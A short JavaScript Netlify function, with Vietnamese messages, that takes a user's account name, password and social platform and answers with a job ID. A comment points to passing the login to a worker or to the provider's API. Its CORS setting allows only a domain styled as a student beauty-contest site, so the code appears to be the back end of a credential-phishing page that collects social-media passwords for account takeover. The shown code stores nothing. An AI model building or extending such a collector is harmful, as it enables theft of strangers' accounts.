// Netlify Function: social-login
// Handle JSON payload { account, password, platform, chrome, note }

export async function handler(event) {
  if (event.httpMethod === 'OPTIONS') {
    return {
      statusCode: 204,
      headers: corsHeaders(event.headers?.origin),
    };
  }

  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      headers: corsHeaders(event.headers?.origin),
      body: JSON.stringify({ success: false, message: 'Method Not Allowed' }),
    };
  }

  try {
    const body = JSON.parse(event.body || '{}');
    const { account, password, platform, chrome, note } = body;

    if (!account || !password || !platform) {
      return {
        statusCode: 400,
        headers: corsHeaders(event.headers?.origin),
        body: JSON.stringify({ success: false, message: 'Thiếu trường bắt buộc (account/password/platform)' }),
      };
    }

  // Ghi chú: Ở môi trường production, nên đẩy yêu cầu vào hàng đợi (worker/queue)
  // hoặc gọi trực tiếp API của nhà cung cấp thông qua service chuyên trách.
    const jobId = `job_${Math.random().toString(36).slice(2, 10)}`;

    return {
      statusCode: 200,
      headers: corsHeaders(event.headers?.origin),
      body: JSON.stringify({
        success: true,
        message: 'Đã nhận yêu cầu đăng nhập, đang xử lý.',
        jobId,
      }),
    };
  } catch (e) {
    return {
      statusCode: 400,
      headers: corsHeaders(event.headers?.origin),
      body: JSON.stringify({ success: false, message: 'JSON không hợp lệ', error: String(e) }),
    };
  }
}

function corsHeaders(origin) {
  const allowOrigin = 'https://missudsinhvien2025.online';
  return {
    'Access-Control-Allow-Origin': allowOrigin,
    'Access-Control-Allow-Headers': 'Content-Type, Authorization',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
    'Access-Control-Allow-Credentials': 'true',
    'Content-Type': 'application/json; charset=utf-8',
  };
}
